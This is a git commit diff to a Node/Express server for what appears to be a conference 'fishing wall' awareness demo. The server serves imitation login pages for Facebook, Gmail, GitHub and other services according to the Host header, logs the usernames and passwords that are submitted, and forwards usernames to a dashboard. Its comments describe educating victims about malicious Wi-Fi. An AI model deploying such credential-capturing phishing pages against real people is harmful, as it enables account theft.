8732bea8b6feca375f7448ebbe27f998b5070ea7
zeze <zezectf@gmail.com>
2023-05-21 16:41:11 +0800

    feat: communicatation between fish and dashboard

--- backend/server.js
+++ backend/server.js
@@ -1,77 +1,89 @@
 const express = require('express');
 const path = require('path');
 const bodyParser = require('body-parser')
+const request = require('request')
 
 const jsonParser = bodyParser.json()
 const urlencodedParser = bodyParser.urlencoded({ extended: false })
 const app = express();
 const port = 5001
+const dashboardServer = 'http://127.0.0.1:5002'
 
 app.use(express.static(path.join(__dirname, '../frontend')));
 
 // Receive the account information from fishing sites.
-app.post('/fish', urlencodedParser, function(request, response){
+app.post('/fish', urlencodedParser, function(req, res){
     // TODO: Get account information and store into the coressponding json file according to gmail account.
-    const host = request.headers.host
+    const host = req.headers.host
     console.log(host)
-    console.log(request.url);
+    console.log(req.url);
 
-    const username = request.body.username;
-    const password = request.body.password;
+    const username = req.body.username;
+    const password = req.body.password;
     console.log(`username: ${username}`);
     console.log(`password: ${password}`);
 
-    // TODO: Request dashboard server to update fish information.
-    
+    if(typeof(username) === 'string'){
+        // Request dashboard server to update fish information.
+        request({
+            uri: `${dashboardServer}/fish`,
+            method: 'POST',
+            form: {
+                username: username
+            }
+        }, function(error, res, body) {
+            console.log(body);
+        });
+    }
 
     // Redirect to introduction page.
-    response.redirect('introduction')
+    res.redirect('introduction')
 });
 
 // Introduce hitcon fishing wall.
-app.get('/introduction', function(request, response){
+app.get('/introduction', function(req, res){
     // TODO: 科普惡意 wifi 的危害以及辨認方法
     // TODO: 告知綿羊這個 wifi 不會偷其他的東西，並且綿羊牆是匿名的，請綿羊放心
     // TODO: 請他去連官方提供的 wifi
     // TODO: 告知他釣魚牆的相關資訊，e.g. 位置、釣魚牆統計資料
-    response.sendFile('frontend/introduction/index.html', {root: '../'});
+    res.sendFile('frontend/introduction/index.html', {root: '../'});
 });
 
 // Receive flags.
-app.get('/flag', function(request, response){
+app.get('/flag', function(req, res){
     // TODO (optional): Get flag from frontend and store into the corresponding json file.
 });
 
 // Display all fishing sites.
-app.all('*', function(request, response){
+app.all('*', function(req, res){
     // TODO: Redirect to fishing sites based on the request url.
-    const host = request.headers.host
+    const host = req.headers.host
     console.log(host)
-    console.log(request.url);
+    console.log(req.url);
     
     if (host.includes('facebook')){
-        response.sendFile('frontend/facebook/index.html', {root: '../'});
+        res.sendFile('frontend/facebook/index.html', {root: '../'});
     }
     else if (host.includes('gmail')){
-        response.sendFile('frontend/gmail/index.html', {root: '../'});
+        res.sendFile('frontend/gmail/index.html', {root: '../'});
     }
     else if (host.includes('twitter')){
-        response.sendFile('frontend/twitter/index.html', {root: '../'});
+        res.sendFile('frontend/twitter/index.html', {root: '../'});
     }
     else if (host.includes('github')){
-        response.sendFile('frontend/github/index.html', {root: '../'});
+        res.sendFile('frontend/github/index.html', {root: '../'});
     }
     else if (host.includes('linkedin')){
-        response.sendFile('frontend/linkedin/index.html', {root: '../'});
+        res.sendFile('frontend/linkedin/index.html', {root: '../'});
     }
     else if (host.includes('instagram')){
-        response.sendFile('frontend/instagram/index.html', {root: '../'});
+        res.sendFile('frontend/instagram/index.html', {root: '../'});
     }
     else if (host.includes('hackmd')){
-        response.sendFile('frontend/hackmd/index.html', {root: '../'});
+        res.sendFile('frontend/hackmd/index.html', {root: '../'});
     }
     else{
-        response.sendFile('frontend/hitcon/index.html', {root: '../'});
+        res.sendFile('frontend/hitcon/index.html', {root: '../'});
     }
 });
 
